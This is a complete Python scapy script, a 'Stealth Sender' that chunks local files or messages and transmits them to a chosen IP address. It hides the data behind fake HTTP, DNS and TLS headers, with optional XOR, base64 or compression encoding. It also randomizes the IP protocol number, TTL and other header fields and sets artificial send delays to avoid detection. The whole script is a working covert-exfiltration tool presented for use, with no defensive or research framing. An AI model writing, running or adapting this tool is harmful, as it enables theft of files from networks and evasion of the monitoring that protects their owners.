#!/usr/bin/env python3
import argparse
import os
import random
import time
import base64
import zlib
from scapy.all import *

class StealthSender:
    def __init__(self, args):
        self.args = args
        self.interface = args.interface
        self.dest_ip = args.destination4
        self.seq_number = 0
        self.obfuscation_mode = args.obfuscation
        
        if not self.dest_ip:
            print("[!] Destination IP is required! Use -d4 <ip_address>")
            exit(1)
            
        print(f"🕵️  Stealth Sender on {self.interface}")
        print(f"🎯 Destination: {self.dest_ip}")
        print(f"🔒 Obfuscation: {self.obfuscation_mode}")
        print(f"⏰ Delay: {args.delay}ms between packets")
        print(f"📦 Chunk size: {args.chunk_size} bytes")
        print("-" * 50)

    def get_interface_ip(self):
        """Get IP address of the interface"""
        try:
            if self.interface == 'lo':
                return "127.0.0.1"
            
            ip = get_if_addr(self.interface)
            if ip and ip != '0.0.0.0':
                return ip
                
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "127.0.0.1"

    def encode_payload(self, payload):
        """Encode payload based on obfuscation mode"""
        try:
            if self.obfuscation_mode == "none":
                return payload
            elif self.obfuscation_mode == "base64":
                return base64.b64encode(payload)
            elif self.obfuscation_mode == "compression":
                return zlib.compress(payload)
            elif self.obfuscation_mode == "xor":
                # Simple XOR encryption with a fixed key
                key = b'covert'
                return bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
            else:
                return payload
        except Exception as e:
            print(f"[!] Encoding error: {e}")
            return payload

    def create_stealth_packet(self, payload):
        """Create a stealthy packet"""
        try:
            src_ip = self.get_interface_ip()
            if not src_ip:
                return None

            # Randomize protocol for stealth
            protocols = [41, 47, 50, 51]
            proto = random.choice(protocols)
            
            # Create IP layer with randomized fields
            ip_layer = IP(
                proto=proto,
                src=src_ip,
                dst=self.dest_ip,
                ttl=random.randint(32, 255),
                id=random.randint(1000, 65535),
                tos=random.randint(0, 255),
                flags=0,
                frag=0
            )
            
            # Create IPv6 layer with random addresses
            ipv6_src = f"fe80::{random.randint(1,255):02x}{random.randint(1,255):02x}:{random.randint(1,255):02x}{random.randint(1,255):02x}"
            ipv6_dst = f"fe80::{random.randint(1,255):02x}{random.randint(1,255):02x}:{random.randint(1,255):02x}{random.randint(1,255):02x}"
            ipv6_layer = IPv6(src=ipv6_src, dst=ipv6_dst)
            
            # Use specified ports
            sport = self.args.srcport
            dport = self.args.dstport
            
            # Transport layer
            if self.args.tcp:
                transport = TCP(sport=sport, dport=dport, flags="S")
            else:
                transport = UDP(sport=sport, dport=dport)
            
            # Add obfuscation
            final_payload = self.add_obfuscation(payload)
            
            raw_layer = Raw(load=final_payload)
            
            return ip_layer/ipv6_layer/transport/raw_layer
            
        except Exception as e:
            if self.args.verbose:
                print(f"[!] Packet creation error: {e}")
            return None

    def add_obfuscation(self, payload):
        """Add stealth obfuscation"""
        # Different types of fake headers
        obfuscation_types = [
            b'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: ',
            b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
            b'\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03',
            b'\x00\x00\x00\x00\x00\x00\x00\x00',
        ]
        
        obfuscation = random.choice(obfuscation_types)
        
        if isinstance(payload, str):
            payload = payload.encode()
        
        # Clear separator for receiver
        separator = b'COVERT|'
        
        return obfuscation + separator + payload

    def send_packet(self, payload):
        """Send a single packet with optional delay"""
        packet = self.create_stealth_packet(payload)
        if packet:
            send(packet, iface=self.interface, verbose=False)
            
            # Apply delay if specified
            if self.args.delay > 0:
                time.sleep(self.args.delay / 1000.0)  # Convert ms to seconds
                
            if self.args.verbose:
                print(f"✓ Sent packet ({len(packet)} bytes)")
            return True
        return False

    def send_message(self, message):
        """Send a text message"""
        try:
            timestamp = int(time.time())
            payload = f"MSG:{self.seq_number}:{timestamp}:{message}"
            self.seq_number += 1
            
            success = self.send_packet(payload)
            if success:
                print(f"✅ Message sent: {message}")
            return success
            
        except Exception as e:
            print(f"[!] Error sending message: {e}")
            return False

    def send_file(self, file_path):
        """Send a file in chunks with configurable chunk size"""
        try:
            if not os.path.exists(file_path):
                print(f"[!] File not found: {file_path}")
                return False

            file_size = os.path.getsize(file_path)
            chunk_size = self.args.chunk_size
            total_chunks = (file_size + chunk_size - 1) // chunk_size
            
            print(f"📁 Sending file: {os.path.basename(file_path)}")
            print(f"📦 Size: {file_size} bytes, Chunks: {total_chunks}")
            print(f"🔒 Obfuscation: {self.obfuscation_mode}")
            print(f"⚡ Chunk size: {chunk_size} bytes, Delay: {self.args.delay}ms")
            
            with open(file_path, 'rb') as f:
                for chunk_num in range(total_chunks):
                    chunk_data = f.read(chunk_size)
                    
                    # Encode the chunk data based on obfuscation mode
                    encoded_data = self.encode_payload(chunk_data)
                    
                    # Create file chunk payload with proper format
                    metadata = f"FILE:{os.path.basename(file_path)}:{chunk_num}:{total_chunks}:{self.obfuscation_mode}:"
                    payload = metadata.encode() + encoded_data
                    
                    if self.send_packet(payload):
                        if self.args.verbose or chunk_num % 10 == 0 or chunk_num == total_chunks - 1:
                            progress = (chunk_num + 1) / total_chunks * 100
                            print(f"📤 Progress: {progress:.1f}% ({chunk_num + 1}/{total_chunks})")
                    
            print("✅ File sent successfully!")
            return True
            
        except Exception as e:
            print(f"[!] Error sending file: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='Stealth File/Message Sender')
    
    parser.add_argument('-i', '--interface', required=True, help='Network interface (e.g., eth0, wlan0)')
    parser.add_argument('-d4', '--destination4', required=True, help='Destination IPv4 address')
    
    # Content options
    parser.add_argument('-m', '--message', help='Message to send')
    parser.add_argument('-f', '--file', help='File to send')
    
    # Obfuscation options
    parser.add_argument('-O', '--obfuscation', default='none', 
                        choices=['none', 'base64', 'compression', 'xor'],
                        help='Obfuscation method for file transfer')
    
    # Performance options
    parser.add_argument('--delay', type=int, default=0, help='Delay between packets (milliseconds)')
    parser.add_argument('--chunk-size', type=int, default=500, help='File chunk size (bytes)')
    
    # Network options
    parser.add_argument('-sp', '--srcport', type=int, default=443, help='Source port')
    parser.add_argument('-dp', '--dstport', type=int, default=443, help='Destination port')
    parser.add_argument('-T', '--tcp', action='store_true', help='Use TCP')
    
    # Debugging
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.message and not args.file:
        print("[!] Please specify either --message or --file")
        return
    
    if args.delay < 0:
        print("[!] Delay cannot be negative")
        return
        
    if args.chunk_size < 100:
        print("[!] Chunk size too small (min: 100 bytes)")
        return
        
    if args.chunk_size > 2000:
        print("[!] Chunk size too large (max: 2000 bytes)")
        return
    
    sender = StealthSender(args)
    
    if args.message:
        sender.send_message(args.message)
    elif args.file:
        sender.send_file(args.file)

if __name__ == "__main__":
    main()
